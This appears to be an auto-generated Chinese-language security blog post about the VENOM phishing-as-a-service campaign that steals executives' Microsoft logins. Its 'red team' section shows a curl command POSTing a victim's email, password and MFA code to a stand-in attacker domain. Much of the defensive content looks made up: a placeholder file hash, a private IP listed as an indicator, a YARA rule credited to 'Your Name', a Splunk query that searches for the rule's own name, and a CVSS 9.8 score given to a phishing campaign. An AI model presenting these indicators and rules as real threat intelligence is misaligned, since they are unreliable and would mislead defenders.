---
layout: post
title:  "New VENOM phishing attacks steal senior executives' Microsoft logins"
date:   2026-04-10 01:54:36 +0000
categories: [security]
severity: critical
---

# 🚨 解析 VENOM 攻擊：Phishing-as-a-Service 平台對 C-suite 高管的威脅

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Credential Harvesting
> * **關鍵技術**: Phishing-as-a-Service, QR Code Bypass, Adversary-in-the-Middle (AiTM), Device Code Phishing

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: VENOM 攻擊利用了人類心理學和技術漏洞的結合，通過高度個人化的電子郵件和 QR Code 來欺騙 C-suite 高管泄露其 Microsoft 登入憑證。
* **攻擊流程圖解**:
  1. 攻擊者發送高度個人化的電子郵件，內含 QR Code 和假的 Microsoft SharePoint 文件共享通知。
  2. 受害者掃描 QR Code，被導向一個登陸頁面，該頁面作為安全研究人員和沙盒環境的過濾器。
  3. 如果受害者通過過濾，則被導向一個憑證收集頁面，該頁面代理了一個真實的 Microsoft 登入流程，實時轉發憑證和多因素驗證碼給 Microsoft API，並捕獲會話令牌。
* **受影響元件**: Microsoft SharePoint、Microsoft Login Flow

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有足夠的資源和知識來建立和維護 Phishing-as-a-Service 平台。
* **Payload 建構邏輯**:

    ```
    
    python
      # 範例 Payload 結構
      payload = {
        "email": "victim@example.com",
        "password": "password123",
        "mfa_code": "123456"
      }
    
    ```
  * **範例指令**: 使用 `curl` 發送 HTTP 請求到 VENOM 平台

```

bash
  curl -X POST \
  https://venom-platform.com/login \
  -H 'Content-Type: application/json' \
  -d '{"email": "victim@example.com", "password": "password123", "mfa_code": "123456"}'

```
* **繞過技術**: VENOM 攻擊使用 QR Code 來繞過掃描工具和移動設備的安全檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | venom-platform.com | /login |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule VENOM_Payload {
        meta:
          description = "VENOM Payload Detection"
          author = "Your Name"
        strings:
          $email = "email=" nocase
          $password = "password=" nocase
          $mfa_code = "mfa_code=" nocase
        condition:
          all of them
      }
    
    ```
  * **SIEM 查詢語法** (Splunk):

    ```
    
    spl
      index=security sourcetype=web_traffic | search "VENOM_Payload" | stats count as num_events by src_ip
    
    ```
* **緩解措施**: 使用 FIDO2 驗證，禁用設備代碼流程，實施更嚴格的條件存取政策。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Phishing-as-a-Service (PhaaS)**: 一種提供針對特定目標的釣魚攻擊服務的平台。
* **Adversary-in-the-Middle (AiTM)**: 一種攻擊技術，攻擊者在受害者和合法服務之間插入自己，從而截取和操控通信。
* **Device Code Phishing**: 一種攻擊技術，攻擊者欺騙受害者授權一個惡意設備存取其帳戶。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/new-venom-phishing-attacks-steal-senior-executives-microsoft-logins/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1566/)


